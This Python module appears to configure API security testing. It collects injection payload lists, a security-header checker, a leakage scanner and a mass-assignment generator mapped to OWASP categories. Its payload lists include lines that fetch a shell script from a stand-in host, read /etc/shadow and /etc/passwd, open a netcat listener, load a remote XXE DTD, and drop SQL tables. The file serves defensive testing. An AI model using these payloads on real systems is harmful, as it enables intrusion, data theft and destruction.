"""
Security testing configuration and utilities.

This module provides comprehensive security testing configurations, attack vectors,
and utilities for API security testing. It includes payloads for various injection
attacks, security header configurations, and risk categorization based on OWASP
guidelines and industry best practices.

References:
- OWASP Top 10 (2021): https://owasp.org/www-project-top-ten/
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
"""

from __future__ import annotations

from typing import List, Dict, Any, Optional
from enum import Enum

# Risk levels for security testing
class RiskLevel(Enum):
    """Risk levels for security vulnerabilities."""
    CRITICAL = "critical"      # Immediate threat, system compromise
    HIGH = "high"             # Significant impact, data breach risk
    MEDIUM = "medium"         # Moderate impact, security concern
    LOW = "low"               # Minor impact, best practice violation
    INFO = "info"             # Informational, no direct impact

# OWASP Top 10 (2021) vulnerability categories
class OWASPCategory(Enum):
    """OWASP Top 10 vulnerability categories."""
    A01_BROKEN_ACCESS_CONTROL = "A01:2021 - Broken Access Control"
    A02_CRYPTOGRAPHIC_FAILURES = "A02:2021 - Cryptographic Failures"
    A03_INJECTION = "A03:2021 - Injection"
    A04_INSECURE_DESIGN = "A04:2021 - Insecure Design"
    A05_SECURITY_MISCONFIGURATION = "A05:2021 - Security Misconfiguration"
    A06_VULNERABLE_COMPONENTS = "A06:2021 - Vulnerable and Outdated Components"
    A07_IDENTIFICATION_FAILURES = "A07:2021 - Identification and Authentication Failures"
    A08_SOFTWARE_DATA_INTEGRITY = "A08:2021 - Software and Data Integrity Failures"
    A09_LOGGING_MONITORING = "A09:2021 - Security Logging and Monitoring Failures"
    A10_SSRF = "A10:2021 - Server-Side Request Forgery"

# Security test payloads for injection testing
# Risk Level: HIGH (A03:2021 - Injection)
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('xss')",
    "<svg onload=alert('xss')>",
    "';alert('xss');//",
    "<iframe src=javascript:alert('xss')>",
    "<body onload=alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "<select onfocus=alert('xss') autofocus>",
    "<textarea onfocus=alert('xss') autofocus>",
]

# Risk Level: CRITICAL (A03:2021 - Injection)
# SQL Injection can lead to complete database compromise
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; UPDATE users SET admin=1; --",
    "1'; EXEC xp_cmdshell('dir'); --",
    "' UNION SELECT * FROM admin_users --",
    "'; INSERT INTO users (name) VALUES ('hacked'); --",
    "' OR 1=1 LIMIT 1 --",
    "'; DELETE FROM users WHERE id=1; --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1--",
    "' OR 1=1/*",
]

# Risk Level: HIGH (A03:2021 - Injection)
# NoSQL injection can bypass authentication and access controls
NOSQL_INJECTION_PAYLOADS = [
    "'; return true; //",
    "'; return 1==1; //",
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "{\"$regex\": \".*\"}",
    "{\"$where\": \"function() { return true; }\"}",
]

# Risk Level: HIGH (A03:2021 - Injection)
# LDAP injection can expose directory information
LDAP_INJECTION_PAYLOADS = [
    "*",
    "*)(&",
    "*))%00",
    ")(cn=*",
    "*(|(password=*))",
    "*)(uid=*",
]

# Risk Level: CRITICAL (A03:2021 - Injection)
# Command injection can lead to complete system compromise
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "; cat /etc/shadow",
    "| nc -l 4444",
    "; wget http://evil.com/shell.sh",
    "& ping -c 10 127.0.0.1",
    "; curl http://evil.com",
]

# Risk Level: HIGH (A01:2021 - Broken Access Control)
# Path traversal can expose sensitive files
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
]

# Risk Level: HIGH (A03:2021 - Injection)
# XXE can lead to file disclosure and SSRF
XXE_PAYLOADS = [
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]>",
]

# Risk Level: MEDIUM (A01:2021 - Broken Access Control)
# Unicode attacks can bypass input validation
UNICODE_ATTACKS = [
    "admin\u202Euser",  # Right-to-left override
    "test\uFEFFadmin",  # Zero-width no-break space
    "user\u200Dadmin",  # Zero-width joiner
    "test\u200Cuser",  # Zero-width non-joiner
    "admin\u061Cuser",  # Arabic letter mark
]

# Security headers that should be present
# Risk Level: MEDIUM (A05:2021 - Security Misconfiguration)
# Missing security headers can lead to various attacks
SECURITY_HEADERS = {
    # Prevents MIME type sniffing attacks
    "X-Content-Type-Options": "nosniff",
    
    # Prevents clickjacking attacks
    "X-Frame-Options": ["DENY", "SAMEORIGIN"],
    
    # Legacy XSS protection (modern CSP is preferred)
    "X-XSS-Protection": "1; mode=block",
    
    # Enforces HTTPS connections
    "Strict-Transport-Security": "max-age=31536000",
    
    # Content Security Policy - prevents XSS and data injection
    "Content-Security-Policy": "default-src 'self'",
    
    # Controls referrer information leakage
    "Referrer-Policy": ["strict-origin-when-cross-origin", "no-referrer"],
    
    # Controls browser feature access
    "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
}

# Rate limiting thresholds
# Risk Level: MEDIUM (A05:2021 - Security Misconfiguration)
# Insufficient rate limiting can lead to DoS attacks
RATE_LIMIT_CONFIG = {
    "requests_per_minute": 60,      # Standard rate limit
    "requests_per_second": 10,       # Burst protection
    "burst_requests": 100,           # Maximum burst allowance
    "concurrent_connections": 20,    # Connection pool limit
}

# Sensitive information patterns to avoid in error messages
# Risk Level: MEDIUM (A09:2021 - Security Logging and Monitoring Failures)
# Information disclosure can aid attackers
SENSITIVE_INFO_PATTERNS = [
    "database",
    "sql",
    "server",
    "internal",
    "stack trace",
    "exception",
    "debug",
    "password",
    "secret",
    "key",
    "token",
    "connection string",
    "file path",
    "directory",
]

# Common admin/privileged field names to test for mass assignment
# Risk Level: HIGH (A01:2021 - Broken Access Control)
# Mass assignment can lead to privilege escalation
PRIVILEGED_FIELDS = [
    "admin",
    "is_admin",
    "role",
    "roles",
    "permissions",
    "is_active",
    "status",
    "level",
    "priority",
    "group",
    "groups",
    "password",
    "password_hash",
    "salt",
    "token",
    "api_key",
    "secret",
    "created_by",
    "updated_by",
    "deleted_at",
    "is_deleted",
]


class SecurityTestConfig:
    """
    Configuration class for security tests.
    
    This class provides a centralized configuration for security testing,
    including attack payloads, risk categorization, and OWASP compliance
    mapping. It follows industry best practices and OWASP guidelines.
    
    Attributes:
        xss_payloads: List of XSS attack payloads
        sql_injection_payloads: List of SQL injection payloads
        nosql_injection_payloads: List of NoSQL injection payloads
        ldap_injection_payloads: List of LDAP injection payloads
        command_injection_payloads: List of command injection payloads
        path_traversal_payloads: List of path traversal payloads
        xxe_payloads: List of XXE attack payloads
        unicode_attacks: List of Unicode-based attacks
        security_headers: Dictionary of security headers to check
        rate_limit_config: Rate limiting configuration
        sensitive_patterns: Patterns that indicate information disclosure
        privileged_fields: Fields that should not be mass-assignable
    """
    
    def __init__(self):
        """Initialize security test configuration."""
        self.xss_payloads = XSS_PAYLOADS
        self.sql_injection_payloads = SQL_INJECTION_PAYLOADS
        self.nosql_injection_payloads = NOSQL_INJECTION_PAYLOADS
        self.ldap_injection_payloads = LDAP_INJECTION_PAYLOADS
        self.command_injection_payloads = COMMAND_INJECTION_PAYLOADS
        self.path_traversal_payloads = PATH_TRAVERSAL_PAYLOADS
        self.xxe_payloads = XXE_PAYLOADS
        self.unicode_attacks = UNICODE_ATTACKS
        self.security_headers = SECURITY_HEADERS
        self.rate_limit_config = RATE_LIMIT_CONFIG
        self.sensitive_patterns = SENSITIVE_INFO_PATTERNS
        self.privileged_fields = PRIVILEGED_FIELDS
    
    def get_injection_payloads(self, injection_type: str) -> List[str]:
        """
        Get injection payloads by type.
        
        Args:
            injection_type: Type of injection attack (xss, sql, nosql, etc.)
            
        Returns:
            List of payload strings for the specified injection type
            
        Raises:
            ValueError: If injection_type is not supported
        """
        payload_map = {
            "xss": self.xss_payloads,
            "sql": self.sql_injection_payloads,
            "nosql": self.nosql_injection_payloads,
            "ldap": self.ldap_injection_payloads,
            "command": self.command_injection_payloads,
            "path": self.path_traversal_payloads,
            "xxe": self.xxe_payloads,
            "unicode": self.unicode_attacks,
        }
        
        if injection_type not in payload_map:
            raise ValueError(f"Unsupported injection type: {injection_type}")
        
        return payload_map[injection_type]
    
    def check_security_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """
        Check if security headers are present and properly configured.
        
        This method validates security headers against OWASP recommendations
        and industry best practices.
        
        Args:
            headers: Dictionary of HTTP response headers
            
        Returns:
            Dictionary containing:
                - present: Headers that are correctly configured
                - missing: Headers that are missing
                - warnings: Headers with unexpected values
        """
        results = {
            "present": {},
            "missing": [],
            "warnings": []
        }
        
        for header, expected_values in self.security_headers.items():
            if header in headers:
                actual_value = headers[header]
                if isinstance(expected_values, list):
                    if actual_value not in expected_values:
                        results["warnings"].append(f"{header}: unexpected value '{actual_value}'")
                    else:
                        results["present"][header] = actual_value
                else:
                    if actual_value != expected_values:
                        results["warnings"].append(f"{header}: expected '{expected_values}', got '{actual_value}'")
                    else:
                        results["present"][header] = actual_value
            else:
                results["missing"].append(header)
        
        return results
    
    def check_for_information_leakage(self, response_text: str) -> List[str]:
        """
        Check response text for potential information leakage.
        
        This method scans response text for patterns that might indicate
        sensitive information disclosure, which could aid attackers.
        
        Args:
            response_text: The response text to analyze
            
        Returns:
            List of sensitive patterns found in the response
        """
        found_patterns = []
        response_lower = response_text.lower()
        
        for pattern in self.sensitive_patterns:
            if pattern in response_lower:
                found_patterns.append(pattern)
        
        return found_patterns
    
    def generate_mass_assignment_payload(self, base_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a payload with potential mass assignment fields.
        
        This method creates a payload that attempts to set privileged fields
        that should not be mass-assignable, testing for broken access control.
        
        Args:
            base_data: Base data to include in the payload
            
        Returns:
            Dictionary with potential mass assignment fields added
        """
        payload = base_data.copy()
        
        # Add privileged fields
        for field in self.privileged_fields[:10]:  # Limit to first 10 to avoid huge payloads
            if field not in payload:
                if field in ["admin", "is_admin", "is_active"]:
                    payload[field] = True
                elif field in ["role", "status", "level"]:
                    payload[field] = "admin"
                elif field in ["password", "secret", "token"]:
                    payload[field] = "hacked"
                else:
                    payload[field] = "unauthorized_value"
        
        return payload

    def get_risk_level(self, vulnerability_type: str) -> RiskLevel:
        """
        Get the risk level for a specific vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability (xss, sql, etc.)
            
        Returns:
            RiskLevel enum value
        """
        risk_mapping = {
            "xss": RiskLevel.HIGH,
            "sql": RiskLevel.CRITICAL,
            "nosql": RiskLevel.HIGH,
            "ldap": RiskLevel.HIGH,
            "command": RiskLevel.CRITICAL,
            "path": RiskLevel.HIGH,
            "xxe": RiskLevel.HIGH,
            "unicode": RiskLevel.MEDIUM,
            "csrf": RiskLevel.MEDIUM,
            "csp": RiskLevel.MEDIUM,
            "headers": RiskLevel.MEDIUM,
            "rate_limit": RiskLevel.MEDIUM,
            "mass_assignment": RiskLevel.HIGH,
        }
        
        return risk_mapping.get(vulnerability_type, RiskLevel.INFO)

    def get_owasp_category(self, vulnerability_type: str) -> OWASPCategory:
        """
        Get the OWASP category for a specific vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
            
        Returns:
            OWASPCategory enum value
        """
        category_mapping = {
            "xss": OWASPCategory.A03_INJECTION,
            "sql": OWASPCategory.A03_INJECTION,
            "nosql": OWASPCategory.A03_INJECTION,
            "ldap": OWASPCategory.A03_INJECTION,
            "command": OWASPCategory.A03_INJECTION,
            "path": OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
            "xxe": OWASPCategory.A03_INJECTION,
            "unicode": OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
            "csrf": OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
            "csp": OWASPCategory.A05_SECURITY_MISCONFIGURATION,
            "headers": OWASPCategory.A05_SECURITY_MISCONFIGURATION,
            "rate_limit": OWASPCategory.A05_SECURITY_MISCONFIGURATION,
            "mass_assignment": OWASPCategory.A01_BROKEN_ACCESS_CONTROL,
        }
        
        return category_mapping.get(vulnerability_type, OWASPCategory.A05_SECURITY_MISCONFIGURATION)


# Global security config instance
security_config = SecurityTestConfig()
